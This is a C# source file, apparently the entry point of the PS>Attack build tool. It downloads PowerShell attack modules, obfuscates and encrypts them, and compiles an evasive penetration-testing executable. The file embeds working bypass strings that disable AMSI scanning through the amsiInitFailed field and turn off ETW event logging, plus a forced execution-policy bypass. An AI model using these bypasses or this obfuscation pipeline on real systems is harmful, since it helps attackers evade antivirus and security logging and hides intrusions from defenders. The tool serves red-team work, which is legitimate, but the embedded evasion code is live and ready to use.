using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.Serialization.Json;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Timers;
using System.Management.Automation;
using System.Configuration;

using PSAttackBuildTool.Modules;
using PSAttackBuildTool.Utils;
using PSAttackBuildTool.PSAttack;
using PSAttackBuildTool.ObfuscationEngine;

namespace PSAttackBuildTool
{
    class Program
    {
        static void Main(string[] args)
        {

            // PRINT START MESSAGE
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(Strings.psaStartMsg);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(Strings.psaWarningMsg);
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("\n Press any enter key to start the build process..");
            Console.ReadLine();
            Console.Clear();

            // DISPLAY DASHBOARD
            Display.Dashboard();
            GeneratedStrings keyStoreStrings = new GeneratedStrings();
            Random random = new Random();

            // DELETE BUILD DIR
            Display.Stage("Initializing..");
            Display.Status("Clearing Build Dir: " + PSABTUtils.GetPSAttackBuildToolDir());
            Directory.Delete(PSABTUtils.GetPSAttackBuildToolDir(), true);

            //READ JSON FILE
            Display.Stage("Initializing..");
            Display.Status("Loading modules.json");
            StreamReader sr = new StreamReader("modules.json");
            string modulesJson = sr.ReadToEnd();
            MemoryStream memReader = new MemoryStream(Encoding.UTF8.GetBytes(modulesJson));
            List<Module> modules = PSABTUtils.GetModuleList(memReader);
            string workingDir = PSABTUtils.GetPSAttackBuildToolDir();

            //GET PS>ATTACK 
            Display.Stage("Getting PS>Attack");
            Display.Status("Searching Github");
            Attack attack = PSABTUtils.GetPSAttack();
            Display.Status("Found Version: " + attack.tag_name);
            Display.PrimaryMessage("Downloading " + attack.zipball_url);
            attack.DownloadZip();
            Display.PrimaryMessage("Unzipping to: " + Strings.attackUnzipDir);
            attack.unzipped_dir = PSABTUtils.UnzipFile(Strings.attackZipPath, Strings.attackUnzipDir);

            // PROCESS PS>ATTACK
            Display.Stage("Preparing PS>Attack Build");

            // CLEAR OUT BUNDLED MODULES
            Display.Status("Clearing modules at: " + attack.modules_dir);
            Display.PrimaryMessage("");
            attack.ClearModules();

            // CREATE DIRECTORY STRUCTURE

            if (!(Directory.Exists(Strings.moduleSrcDir)))
            {
                Display.Status("Creating Modules Source Directory: " + Strings.moduleSrcDir);
                Directory.CreateDirectory(Strings.moduleSrcDir);
            }

            if (!(Directory.Exists(Strings.obfuscatedScriptsDir)))
            {
                Display.Status("Creating Obfuscated Modules Directory: " + Strings.obfuscatedScriptsDir);
                Directory.CreateDirectory(Strings.obfuscatedScriptsDir);
            }

            if (!(Directory.Exists(Strings.obfuscatedSourceDir)))
            {
                Display.Status("Creating Obfuscated Source Directory: " + Strings.obfuscatedSourceDir);
                Directory.CreateDirectory(Strings.obfuscatedSourceDir);
            }

            if (!(Directory.Exists(Strings.invokeObfuscationDir)))
            {
                Display.Status("Creating Obfuscated Source Directory: " + Strings.invokeObfuscationDir);
                Directory.CreateDirectory(Strings.invokeObfuscationDir);
            }

            // CLEAR OUT OBFUSCATED SCRIPTS DIR
            DirectoryInfo dirInfo = new DirectoryInfo(Strings.obfuscatedScriptsDir);
            foreach (FileInfo file in dirInfo.GetFiles())
            {
                Display.Status("Clearing Obfuscated Modules Directory");
                Display.PrimaryMessage("Deleting: " + file.Name);
                file.Delete();
            }

            // DOWNLOAD @DANIELBOHANNON's INVOKE-OBFUSCATION
            if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
            {
                ObfuscationEngine.Posh.DownloadInvokeObfuscation();
            }

            // MAKE NEW MODULES
            Display.Stage("Processing Modules");
            Display.Status("");
            Display.PrimaryMessage("");
            foreach (Module module in modules)
            {
                string dest = Path.Combine(Strings.moduleSrcDir, (module.name + ".ps1"));
                string encOutfile = attack.modules_dir + CryptoUtils.EncryptString(attack, module.name, keyStoreStrings);
                try
                {
                    Display.Status($"Processing {module.name}");
                    Display.PrimaryMessage($"Downloading from {module.url}");
                    PSABTUtils.DownloadFile(module.url, dest);
                    
                    if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
                    {
                        Display.PrimaryMessage($"Obfuscating {module.name} (This might take a minute or three, literally)");
                        dest = ObfuscationEngine.Posh.InvokeObfuscation(dest, true);
                    }

                    Display.PrimaryMessage($"Encrypting {module.name}");
                    if (Path.GetFileName(dest) != "ERROR")
                    {
                        CryptoUtils.EncryptFile(attack, dest, encOutfile, keyStoreStrings);
                    }
                }
                catch (Exception e)
                {
                    Display.ErrorMessage($"There was an error processing {module.name}.", e.Message);
                }
            }

            // PLACE MATTS AMSI BYPASS IN KEYSTORE
            if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
            {
                keyStoreStrings.Store.Add("amsiBypass", ObfuscationEngine.Posh.InvokeObfuscation("{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}"));
            }
            else
            {
                keyStoreStrings.Store.Add("amsiBypass", "[psobject].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
            }

            // PLACE ETW BYPASS IN KEYSTORE (Source: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)
            keyStoreStrings.Store.Add("etwBypass", ObfuscationEngine.Posh.InvokeObfuscation("{[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)}"));

            keyStoreStrings.Store.Add("setExecutionPolicy", "{Set -ExecutionPolicy Bypass -Scope Process -Force}");
            keyStoreStrings.Store.Add("buildDate", DateTime.Now.ToString());

            // WRITE KEYS TO CSV
            DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(Dictionary<string, string>));
            keyStoreStrings.AddValue("keyStoreFileName");
            using (StreamWriter keystoreCSV = new StreamWriter(Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv")))
            {
                foreach (KeyValuePair<string, string> entry in keyStoreStrings.Store)
                {
                    keystoreCSV.WriteLine("{0}|{1}", entry.Key, entry.Value);
                }
            }

            // Encrypt keystore
            CryptoUtils.EncryptFile(attack, Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv"), Path.Combine(attack.resources_dir, keyStoreStrings.Store["keyStoreFileName"]), keyStoreStrings);


            // GENERATE CSPROJ FILE
            Display.Stage("Building PS>Attack");
            Display.Status("Generating PSAttack.csproj at " + attack.csproj_file);
            Display.PrimaryMessage("");
            PSABTUtils.BuildCsproj(modules, attack, keyStoreStrings);

            // GENERATE SETTINGS FILE
            Display.Stage("Building PS>Attack");
            Display.Status("Generating Config File at " + attack.config_file);
            Display.PrimaryMessage("");
            PSABTUtils.BuildConfigFile(attack, keyStoreStrings);

            // OBFUSCATE
            string[] files = Directory.GetFiles(Strings.attackUnzipDir, "*.*", SearchOption.AllDirectories);
            GeneratedStrings rulesStrings = ObfuscationEngine.CSharp.CreateRules();
            foreach (string file in files)
            {
                ObfuscationEngine.CSharp.ProcessSource(file, rulesStrings, keyStoreStrings, attack);
            }
            
            // BUILD PS>ATTACK
            Timer timer = new Timer(1200);
            Display.Status("Kicking off build");
            Display.PrimaryMessage("3..");
            Display.PrimaryMessage("3.. 2..");
            Display.PrimaryMessage("3.. 2.. 1..\n\n\n");
            Console.ForegroundColor = ConsoleColor.Gray;
            int exitCode = PSABTUtils.BuildPSAttack(attack, rulesStrings);
            if (exitCode == 0)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(Strings.psaEndSuccess, Strings.attackBuildDir);
                Console.ReadLine();
                Process.Start(Strings.attackBuildDir);
            }
            else if (exitCode == 999)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(Strings.psaEndNoMSBuild, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory());
                Console.ReadLine();
                Environment.Exit(exitCode);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(Strings.psaEndFailure);
                Console.ReadLine();
                Environment.Exit(exitCode);

            }

        }
    }
}
